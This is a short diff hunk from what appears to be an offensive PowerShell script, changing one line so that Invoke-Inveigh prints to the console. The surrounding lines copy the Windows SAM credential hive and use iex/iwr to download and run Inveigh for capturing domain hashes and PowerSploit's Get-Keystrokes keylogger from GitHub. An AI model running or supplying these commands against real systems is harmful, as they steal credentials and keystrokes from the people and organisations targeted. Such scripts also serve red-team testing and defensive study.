@@ -9,7 +9,7 @@ Invoke-NinjaCopy -path C:\Windows\System32\config\SAM -LocalDestination $env:Tem
 
 # requires AD Domain to capture hashes
 iex( iwr https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1 -usebasicparsing)
-Invoke-Inveigh
+Invoke-Inveigh -ConsoleOutput Y
 
 ############# user context ok
 iex (iwr https://raw.githubusercontent.com/clr2of8/PowerSploit/master/Exfiltration/Get-Keystrokes.ps1 -usebasicparsing)
